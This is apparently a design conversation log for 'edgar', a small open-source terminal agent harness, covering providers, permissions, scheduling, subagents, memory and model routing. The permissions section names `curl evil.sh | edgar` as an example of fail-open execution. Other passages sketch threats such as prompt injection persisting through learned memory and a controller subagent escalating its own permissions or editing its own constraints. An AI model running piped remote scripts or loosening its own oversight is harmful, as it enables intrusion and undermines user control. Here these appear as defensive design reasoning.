# Brainstorm log

Raw capture of the design conversation that produced the PRD and blueprint. Kept
verbatim-ish on purpose: the *why* behind a decision ages better than the
decision itself, and this file is the record we reprocess later.

Date: 2026-09-02
Participants: Diego (owner), assistant (design foil)

---

## 1. Opening brief (user, verbatim intent)

> help me design a blueprint and prd document to build a small, simplified
> agentic harness to play with.
>
> - must run in terminal
> - can be used as part of unix tools (piped)
> - be able to use oai, claude, azure, openrouter and ollama
> - ideally same code runs in win and mac and linux
> - uses the launch directory as work dir
> - can launch sub agents, use different models for different scopes
> - have basic feedback on what's doing in the bar (similar to hermes)
> - have a good setup for init config / memory / experience tracking
> - autolearn, compact, and other basic utility calls
> - be easy to customize both at runtime (md files, databases etc) and at code time
> - allow for an ai controller subagent that triggers on turn end to optimize,
>   policy, clean output and config (eg runs compact)
> - clean codebase made to learn
> - full suite of tests
> - clearly documented
> - it is a learning open source project, a base for me to learn and for other
>   people to start with something simple, easy to build and use
>
> we brainstorm and you write the docs.
> document the inputs and my comments.
> document the architecture, technical decisions.
> the docs are going to be used in vscode + hermes/claude to build the app.
> the app should be buildable on win/mac/linux.
> the final artefact is an oss github repo.
>
> **am i missing something?**

## 2. Gaps raised against the opening brief

Response to "am I missing something". Each of these became a design area.

1. **No tool layer in the spec.** The tool contract *is* the harness. Needs
   JSON Schema validation, timeouts, output truncation, cancellation, and a
   permission model. Without it, the project is a chat wrapper with a status bar.
2. **Stdout discipline.** Result to stdout, status and logs to stderr, status bar
   only when stderr is a TTY. `--json` for machines. Real exit codes. A defined
   meaning for piped stdin.
3. **Provider normalisation is where the pain lives.** Tool-call shapes, streaming
   deltas, reasoning blocks, system prompt placement, Anthropic `cache_control`,
   Ollama's patchy tool support.
4. **Compaction correctness.** Dropping a `tool_use` without its matching
   `tool_result` gets the request rejected by the API. Pairing invariants and
   pinned blocks must be specified, not improvised.
5. **Autolearn is a prompt-injection sink.** Tool output and fetched web content
   flowing into durable memory is a persistence channel for injected instructions.
6. **The controller subagent can nuke you.** Self-modifying config and policy is a
   footgun without typed proposals, a whitelist, dry-run and revert.
7. **Budget and cost accounting.** Per turn, per session, per subagent, with hard
   caps that abort cleanly. A recursive subagent bug otherwise costs real money.
8. **Session persistence, resume, interrupt.** `--resume`, `--continue`, Ctrl-C
   mid-stream without corrupting state, mid-turn steering.
9. **Subagent semantics.** Depth limit, recursion guard, parallelism cap, context
   inheritance, return shape, own allowlist and budget.
10. **Testing nondeterminism.** The genuinely interesting engineering problem.
11. **Windows realities.** No `fork`, VT mode, path separators, shell choice,
    SQLite locking.
12. **Repo mechanics.** Licence, CI matrix, install channels, name, ADRs,
    `examples/`, a guided tour, and an `AGENTS.md` since the thing is built by agents.
13. **Explicit non-goals.** Write them down or scope creep eats the project.

## 3. Decision thread

Chronological. Each entry: the question, the user's answer, and the reasoning.

### 3.1 Runtime

**Q:** Python, Go, TypeScript or Rust?

**Detour:** user asked what Python's single-binary story actually looks like.
Answer given: `uv tool install` / `uvx` as the blessed path (real command on PATH,
isolated venv, identical on all three OSes); PyApp for downloadable binaries on
Releases; Docker as escape hatch; PyInstaller rejected (self-extract latency on
every launch hurts the piping case, plus Windows Defender false positives on
unsigned OSS builds); zipapps rejected (still needs a system Python).

Key point raised: **the real risk is startup latency, not packaging.** CPython
starts in ~30 ms, then imports decide everything. Eagerly importing three provider
SDKs plus pydantic plus rich puts you at 400 ms+ before a token moves. That has to
be fixed in the architecture (lazy provider imports, no SDK import until a model
is resolved) and enforced as an NFR in CI.

> **User:** "A. Python, uv-first distribution"

Noted honestly at the time: if a true self-contained single binary were a hard
requirement rather than nice-to-have, the decision flips to Go and it isn't close.
Python wins here only because "one install command" is accepted instead of "one file".

### 3.2 Provider layer

**Q:** Own thin adapters, wrap a library (LiteLLM), or hybrid?

Hybrid framing: one adapter covers the OpenAI-compatible family (OpenAI, Azure,
OpenRouter, Ollama) with a small quirks table; a second adapter covers Anthropic.
Two adapters, five providers. Caveat stated: "OpenAI-compatible" is a spectrum,
not a standard, so the quirks table is load-bearing rather than cosmetic.

> **User:** "do C" (hybrid)

### 3.3 MCP

**Q:** MCP in v1, MCP-shaped contract only, or skip?

The useful separation raised: *supporting MCP* and *being shaped by MCP* are
different costs. An MCP-shaped contract now makes a later client a small adapter;
a Python-native contract makes it a rewrite.

Also flagged: "easy to customise at runtime" implies **three** tool sources, not
two. Built-ins, MCP servers, and user-declared shell-out tools. The third is the
highest value per line of code for a hackable harness.

> **User:** "mcp now in v1, and add the other 2 sources: tools and custom tools.
> do not forget skills (we keep claude format for this)"

Consequences worked through:
- Skills are prompt-level extensions, not tools. Needs a `Skill` tool that loads
  the body on demand, plus a discovery pass that reads frontmatter only
  (progressive disclosure).
- Three search paths: bundled, user-level, project-level. Project wins collisions.
- A per-skill companion memory file fits the autolearn requirement exactly: scoped
  experience rather than one undifferentiated memory blob.

### 3.4 Permissions

**Q:** What happens when a tool needs permission and nobody can answer?

The problem the piping requirement creates directly: when stdin is a pipe or
stdout is not a TTY, there is no one to answer "allow this shell command?".
Fail closed and the tool is useless in scripts. Fail open and
`curl evil.sh | edgar` executes arbitrary commands.

> **User:** "require config when piped."
> **User (later, twice, emphasised):** "the piping requires `-p`, normal use is
> through the interactive terminal like hermes/code"

So: interactive REPL is the daily driver and the default. Non-interactive requires
an explicit `-p/--prompt`; piped stdin is *attached context* for that prompt, never
silently the prompt itself. Piped runs also require an explicit permission mode and
error loudly rather than degrading silently.

### 3.5 Scheduling

**Q (user-raised):** "add cron (but i guess it works through shell) or a way to
self trigger at a schedule"

Three shapes weighed. Emit-only (write to crontab/launchd/schtasks) means three
platform backends and the logic lives where you cannot reason about it. A built-in
daemon needs supervision, PID files, log rotation, and *still* needs the host
scheduler to survive a reboot: wrong shape for a unix tool. **Tick** won: a
declarative schedules file, a single `tick` command, and exactly one host entry
per machine installed by a helper.

Why tick is right for a learning project: due-calculation, cron parsing, overlap
prevention, catch-up-after-sleep and jitter all become pure functions testable
with a frozen clock. One integration point per OS instead of three schedulers.

Also noted: scheduled runs are non-interactive by definition, so each schedule
entry carries its own mode and allowlist, which lines up exactly with 3.4.

> **User:** "tick model + agent self scheduling + add notifications in roadmap
> for the future"

### 3.6 Subagents

**Q:** Context inheritance and concurrency?

Decided without asking (no objection raised): subagents are markdown + frontmatter
files, same pattern as skills, carrying name, description, model, tool allowlist
and system prompt, discovered at project and user level. That is what delivers
"different models for different scopes" declaratively, with no code. Permissions
may only narrow relative to the parent, never widen. Budgets inherit from the
parent's remaining allowance; exhaustion returns a partial result rather than
killing the run. Failures surface to the parent as tool errors.

The fork: fresh context is cheaper and isolates cleanly, and forces the parent to
write a genuinely good task spec, which is most of what makes subagents work.
Inherited context fixes under-specification and destroys the main benefit.

> **User:** "B. Fresh context, parallel from v1"

### 3.7 Memory and autolearn

The distinction argued as most important, and most often got wrong:
**hand-authored context and machine-learned memory must never share a file.** If
the agent can append to the `AGENTS.md` you maintain by hand, instructions and
guesses become indistinguishable and you stop trusting both.

Four surfaces proposed: hand-authored instructions (never machine-written), the
session transcript, durable learned facts (machine-written, always reviewable),
and experience telemetry.

Storage argument: SQLite as the store, markdown as the interface. Facts carry
scope, provenance, confidence, timestamps and source, which is what makes dedup,
contradiction detection, decay and eviction possible. `memory edit` renders to
markdown, you edit, it writes back. Retrieval without embeddings: a small pinned
set injected per turn plus a `recall` tool over FTS5 — keeps startup fast and the
mechanism visible, which matters for a teaching repo.

> **User:** "use hybrid sqlite. autolearn learns from user prompts and feedback
> and errors. add a history.md that tracks all user prompts. we want to log the
> whys, the decisions and be able to reprocess them"
>
> **User (follow-up):** "the history is per project/skill/folder"

Narrowing autolearn to prompts + feedback + errors sidesteps the injection channel
**by construction** rather than by filtering, which is a stronger property. Raw
tool output and fetched web content never reach durable memory.

Consequences worked through for `history.md`:
- Entry shape needs more than the prompt: timestamp, prompt, decision, why,
  tools and files touched, outcome, cost. The *why* is what transcripts lose.
- Reprocessing needs a command: `history distill` runs the learner over the log.
  History stays raw, memory stays curated.
- Two risks: a pasted secret in a committed file (redaction on write, `--no-history`
  escape), and unbounded growth (size cap plus archive rotation).
- For skills, the same file in the skill folder doubles as per-skill durable notes.
  One mechanism, two uses.

> **User:** "the history log, use a light llm to summarize/condense the history
> logged when the message is longer than say 200 words"

Refinement added: do it **out of band**, not inline. Condensing a long prompt
before the turn starts adds latency to exactly the prompts that were already slow.
Queue it, flush at turn end or next tick. Verbatim goes to SQLite immediately, so
nothing is lost if the condense call fails.

### 3.8 Controller subagent

Argued as the most interesting thing in the spec and the easiest to get wrong.
Firing on every turn end costs a call per turn, adds latency to every interaction,
and gives a cheap model repeated licence to touch config — which is how you get
config drift you cannot explain.

Safety design stated as mattering more than the trigger choice: no arbitrary tool
access; typed proposals from a fixed whitelist; dry-run by default; every mutation
logged with a revert path; **policy may only tighten, never loosen**, otherwise a
compromised controller escalates its own permissions.

> **User:** "deterministic and llm (small model) on trigger. llm only has limited tools"

### 3.9 Testing

Four offline layers proposed: a fake provider (loop, dispatch, permissions,
compaction, controller tested with zero network and zero cost); a provider
**contract suite** every adapter must pass identically (this is what stops "works
on OpenAI, breaks on Ollama"); HTTP cassettes for schema drift a fake provider
cannot catch; property tests for the pure functions (compaction pairing
invariants, cron due-calc, path scoping, redaction).

Open question was live testing: cassettes go stale *silently*, so you learn about
a provider's streaming change from a user rather than from CI. Against that, live
tests need keys, cost money, and fail for reasons unrelated to your code.

> **User:** "C" (offline in CI + scheduled live smoke + eval harness)

### 3.10 Name

PyPI was picked clean across three rounds of candidates. Free and checked:
`treadle`, `loomlet`, `carder`, `tumbler`, `cadence`, `tinyharness`, `agentcrank`,
`looprunner`, `harnesslet`, `agentharness`, `warpweft`, `cranklet`, `minor-agent`.

Recommendation was `treadle` (the pedal that drives a loom: a simple mechanism a
person operates that makes a complex machine run one cycle at a time).

> **User:** "Edgar"

`edgar` is taken on PyPI and SEC EDGAR dominates the search results for the word.
Both flagged; user accepted: *"it's fine"*. Command stays `edgar`, package ships
as `edgar-cli`.

## 4. Post-review additions (2026-09-02, later session)

### 4.1 OQ-2 resolved

> **User:** "OQ-2: your proposal is sound. implement it."

The controller may never write `AGENTS.md` or `config.toml`. Reasoning sharpened
during implementation: `AGENTS.md` is part of what *constrains* the controller, so
a controller able to edit it is editing its own constraints. That is a loop with no
fixed point, and it fails **silently** — nothing breaks, the rules just drift until
behaviour no longer matches anything the user wrote.

`propose_instruction` added to the whitelist. Emits a unified diff to
`.edgar/proposals/<id>.diff`, shown to the user, applied only via
`edgar controller apply <id>`. [CTRL-12, ADR-0008]

### 4.2 Model routing — a genuine gap

> **User:** "did we write about implementing policies to select the right model
> based on the task?"

No. What existed was **static role binding** (main, controller, condenser,
compactor, per-subagent frontmatter) plus the controller's `switch_model`. That
covers *scope* but not *task*.

The useful insight that came out of it: three things get conflated into one
`pick_model()` and they are not the same feature.

| | Question | When | Direction | Trigger |
|---|---|---|---|---|
| **Routing** | Which model starts this? | Before the turn | n/a | Declarative rules |
| **Escalation** | Not capable enough | Mid-session | Upward only | Repeated failure |
| **Fallback** | Not reachable | Per request | Sideways | Provider error |

Conflating them produces predictable bugs: a fallback that escalates burns money
during an outage; an escalation behaving like a fallback silently downgrades
capability; a router handling provider errors retries the wrong thing.

Options weighed: static only (too rigid), LLM router (a model call per turn — same
objection that made the always-on controller opt-in), declarative pure function
(chosen), learned routing (rejected as automatic, kept as `route suggest`).

Decisions taken:

- `select_model()` is pure, over **eight** conditions, first match wins, same
  evaluation shape as `permissions.decide()` so there is one pattern to learn
- Routing costs zero model calls
- Capability validation at **selection time**, not mid-turn [ROUTE-6]
- Fallback targets must have capabilities ≥ original, or a mid-turn fallback
  produces a transcript the provider rejects [ROUTE-7]
- Escalation capped and always announced, or a struggling task walks the chain to
  the most expensive model and stays there [ROUTE-5, ROUTE-10]
- Controller `switch_model` constrained to the escalation chain or a routing rule
  target, never an arbitrary model string — otherwise it is an unaudited path
  around the routing policy [ROUTE-8]
- `route suggest` mines telemetry and prints candidate rules, never writes config,
  consistent with the memory design: the machine proposes, the human decides

Cut deliberately: time of day, file types, git branch, day of week as routing
conditions. Eight is already a matrix; sixteen is a configuration language nobody
will test.

Full reasoning in [ADR-0013](adr/0013-model-routing.md).

## 5. Still open

Carried into the PRD as open questions rather than silently decided.

- **OQ-1** Should `history.md` be gitignored by default or committed by default?
  Committed makes it a shareable artifact of intent; gitignored is safer given the
  redaction risk. Current lean: gitignored by default, documented as
  opt-in-to-commit.
- **OQ-3** Fine-grained token counting per provider, or a single approximate
  tokeniser with per-provider correction factors? Affects compaction thresholds
  and budget accuracy. Current lean: approximate + correction, exact where the
  provider returns usage.
- **OQ-4** Does the interactive REPL get a full TUI or stay line-oriented with a
  status line? Current lean: line-oriented. A full TUI fights the unix story and
  triples the surface to test.
- **OQ-5** Session storage format: one SQLite DB per project, or JSONL transcripts
  plus a DB for indices? **Resolved in ADR-0010:** JSONL + DB, because a transcript
  you can `grep` and `tail` is worth a lot in a teaching repo.

**Resolved:** OQ-2 (§4.1), OQ-5 (ADR-0010).
